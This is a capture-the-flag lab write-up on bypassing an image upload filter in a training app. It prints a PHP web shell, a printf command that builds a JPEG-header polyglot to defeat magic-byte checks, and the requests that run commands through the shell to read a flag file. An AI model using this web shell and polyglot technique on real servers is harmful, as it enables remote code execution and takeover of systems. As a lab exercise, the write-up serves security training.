# Calliope Gallery

### Lab Link
[WebVerse - Calliope Gallery](https://dashboard.webverselabs-pro.com/academy/file-upload-attacks/practice/challenge/false-bottom?back=%2Facademy%2Ffile-upload-attacks%3Ftab%3Doverview)

---

### Skills & Knowledge
- File Upload (Server Side Exploitation)
- Magic Bytes
- Polygot
- RCE
- Path Traversal

---

## Vulnerability Overview

### Vulnerability Type: Unrestricted File Upload leading to Remote Code Execution (RCE) via Magic Byte Bypass and Path Traversal.

> *Target: Portfolio image upload functionality.*

---

### Initial Reconnaissance & Restrictions

#### Account creation allowed access to the "My Portfolio" feature, which includes an image upload utility.

Direct upload of a standard web shell `shell.php` failed with a file type restriction error.

#### Content-Type Header Explanation: The upload request utilizes
`Content-Type: multipart/form-data. `

This encoding type is used when uploading files via HTTP forms. It splits the message body into multiple parts separated by a boundary, allowing text fields and binary file data to be sent simultaneously in a single POST request.

> Header works depends entirely on how the backend application implements its security checks

---

### Bypassing File Validation

- #### Attempt 1: 
    
    Created a simple script to RCE for File Upload.
    ```
    <?php system($_GET["cmd"]); ?>
    ```
    Renaming the file to `shell.php.jpg` failed, indicating validation checked deeper than the file extension.

- #### Attempt 2: 
    Adding JPEG magic bytes `\xff\xd8\xff\xe0JFIF\x00` to the PHP payload `shell.php.jpg` still failed file signature sniffing.

- #### Successful Attempt (Polyglot Creation): 
    Built a valid `polyglot` file combining a genuine JPEG header structure with PHP execution code using command line utilities:

```
printf '\xff\xd8\xff\xe0JFIF\x00<?php system($_GET["cmd"]); ?>' > shell.php.jpg
```

> The server successfully verified the file signature as a legitimate image and stored it.

> *Note: Editing the file using `nano` is useless as it still verifies the file signature. Only way is to create the payload using `printf` or `echo -e.`*
---

### Remote Code Execution (RCE)

Inspected the application's `HTTP Response` to locate the uploaded file path:

```
<img src="/portfolio/9/shell.php.jpg">
```

#### Parameter Explanation:
The `?cmd=` parameter is a user-supplied input dynamically passed to the system command execution function `system()` embedded in the uploaded file, allowing arbitrary OS command execution on the server via `HTTP GET Requests`.

Appended the execution parameter to the uploaded file URL:
```
https://target-url.com/portfolio/9/shell.jpg?cmd=id
```

> Output confirmed execution with valid system privileges (uid, gid, groups).

---

### Path Traversal & Flag Retrieval

Utilized directory traversal techniques via the command parameter to navigate the file system:

```
?cmd=ls
```

```
?cmd=ls ../
```

```
?cmd=ls ../../../../../
```

Located `flag.txt` in the root directory and extracted its contents:

```
?cmd=cat ../../../../../flag.txt
```
